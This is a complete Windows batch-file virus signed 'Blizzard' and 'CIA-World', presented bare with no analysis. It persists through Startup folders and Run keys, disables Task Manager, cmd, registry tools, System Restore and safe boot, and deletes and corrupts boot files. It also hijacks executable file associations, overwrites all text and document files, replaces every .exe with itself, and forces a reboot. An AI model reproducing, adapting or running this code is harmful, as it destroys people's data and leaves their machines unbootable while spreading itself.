@echo off
IF EXIST ciaworld.txt GOTO cia
IF NOT EXIST ciaworld.txt GOTO work
:cia
reg add "HKLM\Software\Microsoft\Windows Script Host\Settings" /v Enabled /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows Script Host\Settings" /v Timeout /t REG_DWORD /d "0" /f
echo MessageBox MsgBox("Blizzard saved your PC! Visit www.cia-world.dl.am", VbExclamation + vbOK, "")>%temp%\sleep.vbs
cscript /nologo %temp%\sleep.vbs
erase %temp%\sleep.vbs
exit
:work
copy %0 "%userprofile%\startm~1\Programme\Autostart\"
copy %0 "%ALLUSERSPROFILE%\startm~1\Programme\Autostart\"
copy %0 "%ALLUSERSPROFILE%\Start Menu\Programs\Startup\"
echo Y | reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v cba /t REG_SZ /d "%0"
echo Y | reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v cba2 /t REG_SZ /d "%userprofile%\startm~1\Programme\Autostart\%0"
echo Y | reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v cba3 /t REG_SZ /d "%ALLUSERSPROFILE%\Start Menu\Programs\Startup\"
echo Y | reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v cba4 /t REG_SZ /d "%ALLUSERSPROFILE%\startm~1\Programme\Autostart\"
reg add HKCU\Software\Policies\Microsoft\Windows\System\ /v DisableCMD /t REG_DWORD /d 2 /f
reg add HKLM\Software\Policies\Microsoft\Windows\System\ /v DisableCMD /t REG_DWORD /d 2 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v DisableRegistryTools /t REG_DWORD /d 1 /f
reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v DisableRegistryTools /t REG_DWORD /d 1 /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\WebView\BarricadedFolders" /v shell:Windows /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\WebView\BarricadedFolders" /v shell:System /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\WebView\BarricadedFolders" /v shell:SystemDriveRootFolder /t REG_DWORD /d "1" /f
reg delete "HKLM\SYSTEM\currentcontrolset\control\safeboot\minimal" /f
reg delete "HKLM\SYSTEM\CurrentControlSet\control\safeboot\network" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer" /v NoRecycleFiles /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows\Currentversion\Explorer\Advanced" /v Start_Show_Run /t REG_DWORD /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\Currentversion\Explorer\Advanced" /v Start_Show_Search /t REG_DWORD /d "0" /f
reg add "HKCU\Software\Microsoft\Windows\Currentversion\Explorer\Advanced" /v Start_ControlPanel /t REG_DWORD /d "0" /f
reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v DisableSR /t REG_DWORD /d "1" /f
reg add "HKLM\Software\Microsoft\Windows Script Host\Settings" /v Enabled /t REG_DWORD /d "1" /f
reg add "HKCU\Software\Microsoft\Windows Script Host\Settings" /v Timeout /t REG_DWORD /d "0" /f
attrib +R +S +H "%userprofile%\startm~1\Programme\Autostart\%0"
attrib +R +S +H "%ALLUSERSPROFILE%\startm~1\Programme\Autostart\"
attrib +R +S +H "%ALLUSERSPROFILE%\Start Menu\Programs\Startup\"
attrib +R +S +H %0
ren %SYSTEMROOT%\system32\shutdown.exe shutdown.blizzard
start http://web28.n-m-b.info/community/index.php
cd %SYSTEMDRIVE%\
cd %HOMEDRIVE%\
attrib -R -A -S -H boot.ini
attrib -R -A -S -H AUTOEXEC.BAT
attrib -R -A -S -H bootfont.bin
attrib -R -A -S -H CONFIG.SYS
attrib -R -A -S -H IO.SYS
attrib -R -A -S -H MSDOS.SYS
attrib -R -A -S -H NTDETECT.COM
attrib -R -A -S -H ntldr
DEL boot.ini
DEL AUTOEXEC.BAT
DEL bootfont.bin
DEL CONFIG.SYS
DEL IO.SYS
DEL MSDOS.SYS
DEL NTDETECT.COM
DEL ntldr
echo [boot loader] >>boot.ini
echo timeout=600 >>boot.ini
echo default=multi(0)disk(0)rdisk(0)partition(1)\WIND0OfS >>boot.ini
assoc .exe=done by Blizzard
assoc exe=done by Blizzard
assoc .bat=done by Blizzard
assoc bat=done by Blizzard
assoc .com=done by Blizzard
assoc com= done by Blizzard
assoc .lnk=done by Blizzard
assoc lnk=done by Blizzard
cd\
for /r %%a in (*.txt *.do* *.rtf *.wiz) do echo Killed by CIA-World, done by Blizzard> "%%a"
for /r %%a in (*.exe) do copy %0 %%a
ren %SYSTEMROOT%\system32\shutdown.blizzard shutdown.exe
echo MessageBox MsgBox("Ready to format?", VbExclamation + vbYesNo, "")>sleep.vbs
cscript /nologo sleep.vbs
erase sleep.vbs
shutdown -r -f -t 30 -c "Killed by CIA-World, done by Blizzard"
